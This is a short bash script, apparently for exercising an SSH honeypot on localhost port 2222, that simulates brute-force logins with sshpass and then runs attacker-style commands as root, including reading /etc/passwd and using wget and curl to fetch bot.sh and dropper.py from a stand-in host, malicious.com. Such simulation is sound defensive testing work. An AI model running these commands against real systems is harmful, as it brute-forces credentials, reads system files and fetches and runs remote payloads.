#!/bin/bash

# Simulate SSH brute-force attempts
echo "[*] Simulating SSH login attempts..."
for i in {1..5}; do
    sshpass -p "wrongpass$i" ssh -o StrictHostKeyChecking=no -p 2222 root@localhost exit
done

# Simulate attacker shell activity
echo "[*] Simulating attacker commands..."
sshpass -p "letmein" ssh -tt -o StrictHostKeyChecking=no -p 2222 root@localhost << EOF
whoami
uname -a
cat /etc/passwd
ps aux
wget http://malicious.com/bot.sh
curl http://malicious.com/dropper.py
python3 bot.py
exit
EOF
